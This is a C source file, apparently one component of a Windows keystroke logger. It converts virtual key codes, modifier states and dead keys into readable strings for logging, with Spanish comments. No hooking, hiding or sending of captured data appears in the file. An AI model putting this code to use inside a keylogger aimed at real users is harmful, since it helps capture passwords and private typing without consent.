#include "winkey.h"

// Buffer estático para construcción de strings de teclas
static char keyStringBuffer[32];

// Verifica si una tecla es modificadora
static BOOL IsModifierKey(DWORD virtualKeyCode)
{
    switch (virtualKeyCode)
    {
        case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:
        case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:
        case VK_LMENU: case VK_RMENU: case VK_MENU:
        case VK_LWIN: case VK_RWIN:
            return TRUE;
        default:
            return FALSE;
    }
}

// Obtiene el prefijo de modificadores activos
static void GetActiveModifiers(char* modifierBuffer, size_t bufferSize)
{
    modifierBuffer[0] = '\0';
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
        strcat_s(modifierBuffer, bufferSize, "[CTRL]");
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
        strcat_s(modifierBuffer, bufferSize, "[SHIFT]");
    if (GetAsyncKeyState(VK_MENU) & 0x8000)
        strcat_s(modifierBuffer, bufferSize, "[ALT]");
}

// Convierte teclas especiales y de navegación
static const char* HandleSpecialKeys(DWORD virtualKeyCode)
{
    switch (virtualKeyCode)
    {
        case VK_RETURN:     return "\n";
        case VK_BACK:       return "[BACKSPACE]";
        case VK_TAB:        return "[TAB]";
        case VK_ESCAPE:     return "[ESC]";
        case VK_CAPITAL:    return "[CAPS]";
        case VK_INSERT:     return "[INSERT]";
        case VK_DELETE:     return "[DELETE]";
        case VK_HOME:       return "[HOME]";
        case VK_END:        return "[END]";
        case VK_PRIOR:      return "[PAGE UP]";
        case VK_NEXT:       return "[PAGE DOWN]";
        case VK_LEFT:       return "[LEFT]";
        case VK_RIGHT:      return "[RIGHT]";
        case VK_UP:         return "[UP]";
        case VK_DOWN:       return "[DOWN]";
        default:            return NULL;
    }
}

// Convierte código de tecla virtual a string legible usando ToUnicodeEx
const char* VkCodeToString(DWORD virtualKeyCode)
{
    BYTE keyboardState[256];
    WCHAR unicodeBuffer[8];
    char modifierPrefix[32];
    const char* specialResult;
    int conversionResult;
    HKL layout = GetKeyboardLayout(0);
    UINT scanCode = MapVirtualKeyEx((UINT)virtualKeyCode, MAPVK_VK_TO_VSC, layout);

    // Ignora modificadores solos
    if (IsModifierKey(virtualKeyCode))
        return "";

    // Teclas especiales
    specialResult = HandleSpecialKeys(virtualKeyCode);
    if (specialResult) {
        GetActiveModifiers(modifierPrefix, sizeof(modifierPrefix));
        if (modifierPrefix[0] != '\0') {
            snprintf(keyStringBuffer, sizeof(keyStringBuffer), "%s%s", modifierPrefix, specialResult);
            return keyStringBuffer;
        }
        return specialResult;
    }

    // Estado del teclado actual
    if (!GetKeyboardState(keyboardState))
        return "";

    // Manejo de combinaciones Control + letra (evitar caracteres de control 0x01..0x1A)
    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && virtualKeyCode >= 'A' && virtualKeyCode <= 'Z') {
        GetActiveModifiers(modifierPrefix, sizeof(modifierPrefix));
        snprintf(keyStringBuffer, sizeof(keyStringBuffer), "%s%c", modifierPrefix, (char)virtualKeyCode);
        return keyStringBuffer;
    }

    // Limpiar buffers
    memset(unicodeBuffer, 0, sizeof(unicodeBuffer));

    // Intentar conversión con ToUnicodeEx (maneja dead keys y layout actual)
    conversionResult = ToUnicodeEx(virtualKeyCode, scanCode, keyboardState,
                                   unicodeBuffer, 8, 0, layout);

    if (conversionResult < 0) {
        // Dead key: limpiar estado llamando de nuevo con buffer dummy
        WCHAR dummy[8];
        ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, dummy, 8, 0, layout);
        return ""; // No logueamos dead key sola
    }

    if (conversionResult == 1) {
        char utf8Char[8] = {0};
        int bytes = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, 1, utf8Char, sizeof(utf8Char) - 1, NULL, NULL);
        if (bytes > 0) {
            // Filtrar no imprimibles (excepto salto de línea ya tratado en especiales)
            unsigned char c = (unsigned char)utf8Char[0];
            if (c < 0x20 || c == 0x7F) {
                return ""; // ignora control
            }
            GetActiveModifiers(modifierPrefix, sizeof(modifierPrefix));
            if (modifierPrefix[0] != '\0') {
                // Si solo hay SHIFT y el caracter ya refleja mayúscula o símbolo, no repetir [SHIFT]
                if (strcmp(modifierPrefix, "[SHIFT]") == 0) {
                    if (!(utf8Char[1] == '\0' && utf8Char[0] >= 'a' && utf8Char[0] <= 'z')) {
                        strcpy_s(keyStringBuffer, sizeof(keyStringBuffer), utf8Char);
                        return keyStringBuffer;
                    }
                }
                // Para otras combinaciones, concatenar prefijos
                snprintf(keyStringBuffer, sizeof(keyStringBuffer), "%s%s", modifierPrefix, utf8Char);
                return keyStringBuffer;
            }
            strcpy_s(keyStringBuffer, sizeof(keyStringBuffer), utf8Char);
            return keyStringBuffer;
        }
    }
    return "";
}